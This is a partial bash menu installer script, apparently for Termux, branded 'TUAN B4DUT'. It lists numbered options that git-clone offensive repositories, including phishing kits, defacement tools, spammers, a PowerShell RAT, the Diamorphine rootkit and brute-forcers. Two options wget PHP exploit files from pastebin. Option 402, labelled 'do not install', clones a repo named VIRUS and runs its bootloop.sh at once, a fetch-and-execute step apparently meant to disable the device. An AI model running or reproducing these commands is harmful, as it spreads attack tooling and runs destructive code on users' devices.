...
echo  "[ASSOCIATE : SILENT ATTACKS] " |lolcat
echo  "[ASSOCIATE : CYBER FAMILY ASSOCIATION] " |lolcat
...
sleep 1
echo  $green"TUAN B4DUT On Your System" |lolcat
...
echo  "#TTD TUAN B4DUT GANS 😎" | lolcat
echo  "#B4DUT MAH BEBAS😎" | lolcat
echo ""
...
echo -e "============================" | lolcat
echo -e $b "312. Install ScAuto.git${enda}";
echo -e "============================" | lolcat
echo -e $b "313. Install Android-NetSpoof${enda}";
echo -e "============================" | lolcat
echo -e $b "314. Install Phishing_Catcher${enda}";
echo -e "============================" | lolcat
echo -e $b "315. Install SSH-HoneyPot${enda}";
echo -e "============================" | lolcat
echo -e $b "316. Install TweetEntropy${enda}";
echo -e "============================" | lolcat
echo -e $b "317. Install Termux-Tools${enda}";
echo -e "============================" | lolcat
echo -e $b "318. Install BTC-INR${enda}";
echo -e "============================" | lolcat
echo -e $b "319. Install An0n-3xPloiTeR-Shell${enda}";
echo -e "============================" | lolcat
echo -e $b "320. Install Deface${enda}";
echo -e "============================" | lolcat
echo -e $b "321. Install Leet1988${enda}";
echo -e "============================" | lolcat
echo -e $b "322. Install ohmyqr${enda}";
echo -e "============================" | lolcat
echo -e $b "323. Install infog${enda}";
echo -e "============================" | lolcat
echo -e $b "324. Install DorkHNZ${enda}";
echo -e "============================" | lolcat
echo -e $b "325. Install choicebot${enda}";
echo -e "============================" | lolcat
echo -e $b "326. Install AOCSPAMMER${enda}";
echo -e "============================" | lolcat
echo -e $b "327. Install ALMAUL-Tools${enda}";
echo -e "============================" | lolcat
echo -e $b "328. Install Mx-Tools${enda}";
echo -e "============================" | lolcat
echo -e $b "329. Install AOCVIRUS${enda}";
echo -e "============================" | lolcat
echo -e $b "330. Install AOCDEFACE${enda}";
echo -e "============================" | lolcat
echo -e $b "331. Install AOCTools${enda}";
echo -e "============================" | lolcat
echo -e $b "332. Install MiniTools${enda}";
echo -e "============================" | lolcat
echo -e $b "333. Install VTools${enda}";
echo -e "============================" | lolcat
echo -e $b "334. Install Traitor${enda}";
echo -e "============================" | lolcat
echo -e $b "335. Install Hacker101${enda}";
echo -e "============================" | lolcat
echo -e $b "336. Install BruteCMS${enda}";
echo -e "============================" | lolcat
echo -e $b "337. Install Movies-For-Hacker${enda}";
echo -e "============================" | lolcat
echo -e $b "338. Install EQGRP${enda}";
echo -e "============================" | lolcat
echo -e $b "339. Install WIFI-Pumpkin${enda}";
echo -e "============================" | lolcat
echo -e $b "340. Install TrackerJacker${enda}";
echo -e "============================" | lolcat
echo -e $b "341. Install Infosec_Reference${enda}";
echo -e "============================" | lolcat
echo -e $b "342. Install Free-Security-eBooks${enda}";
echo -e "============================" | lolcat
echo -e $b "343. Install Dirsearch${enda}";
echo -e "============================" | lolcat
echo -e $b "344. Install Cameradar${enda}";
echo -e "============================" | lolcat
echo -e $b "345. Install Pentest-Wiki${enda}";
echo -e "============================" | lolcat
echo -e $b "346. Install Awesome-Web-Hacking${enda}";
echo -e "============================" | lolcat
echo -e $b "347. Install Blackhat-Arsenal-Tools${enda}";
echo -e "============================" | lolcat
echo -e $b "348. Install Juice-Shop${enda}";
echo -e "============================" | lolcat
...
echo -e "============================" | lolcat
echo -e $b "360. Install Pythem${enda}";
echo -e "============================" | lolcat
echo -e $b "361. Install ShellPop${enda}";
echo -e "============================" | lolcat
echo -e $b "362. Install FiercePhish${enda}";
echo -e "============================" | lolcat
echo -e $b "363. Install phpsploit${enda}";
echo -e "============================" | lolcat
echo -e $b "364. Install One-Lin3r${enda}";
echo -e "============================" | lolcat
echo -e $b "365. Install Reconnoitre${enda}";
echo -e "============================" | lolcat
echo -e $b "366. Install tools${enda}";
echo -e "============================" | lolcat
echo -e $b "367. Install Pydictor${enda}";
echo -e "============================" | lolcat
echo -e $b "368. Install CTF-ALL-IN-ONE${enda}";
echo -e "============================" | lolcat
echo -e $b "369. Install Security-Cheatsheet${enda}";
echo -e "============================" | lolcat
echo -e $b "370. Install PYDICTOR${enda}";
echo -e "============================" | lolcat
echo -e $b "371. Install PrivEsc${enda}";
echo -e "============================" | lolcat
echo -e $b "372. Install Art-Of-Hacking${enda}";
echo -e "============================" | lolcat
echo -e $b "373. Install BruteX${enda}";
echo -e "============================" | lolcat
echo -e $b "374. Install HERCULES${enda}";
echo -e "============================" | lolcat
echo -e $b "375. Install extractTVpassword${enda}";
echo -e "============================" | lolcat
echo -e $b "376. Install VHostScan${enda}";
echo -e "============================" | lolcat
echo -e $b "377. Install Attifyos${enda}";
echo -e "============================" | lolcat
echo -e $b "378. Install 0d1n${enda}";
echo -e "============================" | lolcat
echo -e $b "379. Install Pig${enda}";
echo -e "============================" | lolcat
echo -e $b "380. Install brut3k1t${enda}";
echo -e "============================" | lolcat
echo -e $b "381. Install DiamorPhine${enda}";
echo -e "============================" | lolcat
echo -e $b "382. Install PowerShell-RAT${enda}";
echo -e "============================" | lolcat
echo -e $b "383. Install osrframework${enda}";
echo -e "============================" | lolcat
echo -e $b "384. Install Whonow${enda}";
echo -e "============================" | lolcat
echo -e $b "385. Install Hacking${enda}";
echo -e "============================" | lolcat
echo -e $b "386. Install ajs2${enda}";
echo -e "============================" | lolcat
echo -e $b "387. Install bud1man${enda}";
echo -e "============================" | lolcat
...
echo -e "============================" | lolcat
echo -e $b "398. Install Mailer-Cli${enda}";
echo -e "============================" | lolcat
echo -e $b "399. Install com_Fabrik${enda}";
echo -e "============================" | lolcat
echo -e $b "400. Install con-Foxcontact${enda}";
echo -e "============================" | lolcat
echo -e $b "401. Install SourceFacebook${enda}";
echo -e "============================" | lolcat
echo -e $b "402. JANGAN DIINSTALL-1${enda}";
echo -e "============================" | lolcat
echo -e $b "403. JANGAN DIINSTALL-2${enda}";
echo -e "============================" | lolcat
...
312) git clone https://github.com/mrmsdv/Scauto.git

;;

#Install Android-NetSpoof

313) git clone https://github.com/w-shackleton/android-netspoof

;;

#Install Phishing_Catcher

314) git clone https://github.com/x0rz/phishing_catcher

;;

#Install SSH-HoneyPot

315) git clone https://github.com/x0rz/ssh-honeypot

;;

#Install Tweetentropy

316) git clone https://github.com/x0rz/tweetentropy

;;

#Install Termux-Tools

317) git clone https://github.com/Bhai4You/Termux-Tools

;;

#Install BTC-INR

318) git clone https://github.com/T4P4N/BTC-INR

;;

#Install An0n-3xPloiTeR-Shell

319) git clone https://github.com/Anon-Exploiter/An0n-3xPloiTeR-Shell

;;

#Install Deface

320) git clone https://github.com/Cvar1984/Deface

;;

#Install Leet1998

321) git clone https://github.com/BlackHoleSecurity/leet1998

;;

#Install ohmyqr

322) git clone https://github.com/thelinuxchoice/ohmyqr

;;

#Install infog

323) git clone https://github.com/thelinuxchoice/infog

;;

#Install DorkHNZ

324) git clone https://github.com/Hanzelnutt/DorkHNZ

;;

#Install ChoiceBot

325) git clone https://github.com/thelinuxchoice/choicebot

;;

#Install AOCSPAMMER

326) git clone https://github.com/rootM3eX/AOCSPAMMER

;;

#Install ALMAUL-Tools

327) git clone https://github.com/rootM3eX/ALMAUL-Tools

;;

#Install Mx-Tools

328) git clone https://github.com/rootM3eX/Mx-Tools

;;

#Install AOCVIRUS

329) git clone https://github.com/rootM3eX/AOCVirus

;;

#Install AOCDEFACE

330) git clone https://github.com/Amriez/AOCDEFACE.git

;;

#Install AOCTOOLS

331) git clone https://github.com/rootM3eX/AOCTools

;;

#Install MiniTools

332) git clone https://github.com/rootM3eX/MiniTools

;;

#Install VTools

333) git clone https://github.com/rootM3eX/VTools

;;

#Install Traitor

334) git clone https://github.com/mrbotline/traitor

;;

#Install Hacker101

335) git clone https://github.com/Hacker0x01/hacker101

;;

#Install BruteCMS

336) git clone https://github.com/thelinuxchoice/brutecms

;;

#Install Movies-For-Hacker

337) git clone https://github.com/k4m4/movies-for-hackers

;;

#Install EQGRP

338) git clone https://github.com/x0rz/EQGRP

;;

#Install WIFI-Pumpkin

339) git clone https://github.com/P0cL4bs/WiFi-Pumpkin

;;

#Install TrackerJacker

340) git clone https://github.com/calebmadrigal/trackerjacker

;;

#Install Infosec-Reference

341) git clone https://github.com/rmusser01/Infosec_Reference

;;

#Install Free-Security-eBooks

342) git clone https://github.com/Hack-with-Github/Free-Security-eBooks

;;

#Install Dirsearch

343) git clone https://github.com/maurosoria/dirsearch

;;

#Install Cameradar

344) git clone https://github.com/Ullaakut/cameradar
...
345) git clone https://github.com/nixawk/pentest-wiki


;;


#Install Awesome-Web-Hacking

346) git clone https://github.com/infoslack/awesome-web-hacking

;;

#Install Blackhat-Arsenal-Tools

347) git clone https://github.com/toolswatch/blackhat-arsenal-tools

;;

#Install Juice-Shop

348) git clone https://github.com/bkimminich/juice-shop
...
360) git clone https://github.com/m4n3dw0lf/pythem

;;

#Install ShellPop

361) git clone https://github.com/0x00-0x00/ShellPop

;;

#Install FiercePhish

362) git clone https://github.com/Raikia/FiercePhish

;;

#Install Phpsploit

363) git clone https://github.com/nil0x42/phpsploit

;;

#Install On3-Lin3r

364) git clone https://github.com/D4Vinci/One-Lin3r

;;

#Install Reconnoitre

365) git clone https://github.com/codingo/Reconnoitre

;;

#Install Tools

366) git clone https://github.com/nullsecuritynet/tools

;;

#Install Pydictor

367) git clone https://github.com/LandGrey/pydictor

;;

#Install CTF-ALL-IN-ONE

368) git clone https://github.com/firmianay/CTF-All-In-One


;;

#Install Security-CheatSheet

369) git clone https://github.com/Snifer/security-cheatsheets
...
370) git clone https://github.com/LandGrey/pydictor

;;

#Install PrivEsc

371) git clone https://github.com/1N3/PrivEsc

;;

#Install Art-Of-Hacking

372) git clone https://github.com/The-Art-of-Hacking/art-of-hacking
...
373) git clone https://github.com/1N3/BruteX

;;

#Install HERCULES

374) git clone https://github.com/EgeBalci/HERCULES

;;

#Install extractTVpassword

375) git clone https://github.com/vah13/extractTVpasswords
...
376) git clone https://github.com/codingo/VHostScan

;;

#Install Attifyos

377) git clone https://github.com/adi0x90/attifyos

;;

#Install 0d1n

378) git clone https://github.com/CoolerVoid/0d1n

;;

#Install Pig

379) git clone https://github.com/rafael-santiago/pig

;;

#Install brut3k1t

380) git clone https://github.com/ex0dus-0x/brut3k1t

;;

#Install DiamorPhine

381) git clone https://github.com/m0nad/Diamorphine

;;

#Install PowerShell-RAT

382) git clone https://github.com/Viralmaniar/Powershell-RAT
...
383) git clone https://github.com/i3visio/osrframework

;;

#Install whonow

384) git clone https://github.com/brannondorsey/whonow

;;

#Install Hacking

385) git clone https://github.com/LockGit/Hacking

;;

#Install ajs2

386) git clone https://github.com/arifistifik/ajs2

;;

#Install bud1man

387) git clone https://github.com/und3f1n3/bud1man

;;

#Install Prank

388) git clone https://github.com/siputra12/prank

;;

#Install Jadwal-Sholat

389) git clone https://github.com/aryanrtm/Jadwal-Sholat
...
398) git clone https://github.com/pedro-stanaka/mailer-cli.git
...
399) wget https://pastebin.com/raw/LDvFvtUD -O com_fabrik.php

;;

#Install Com_foxcontact

400) wget https://pastebin.com/raw/EAtSir5V -O com_foxcontact.php


;;

#Install SourceFacebook

401) git clone http://github.com/mrmsdv/SourceFacebook.git
...
402) git clone https://github.com/TUANB4DUT/VIRUS
cd VIRUS
chmod +x bootloop.sh
sh bootloop.sh
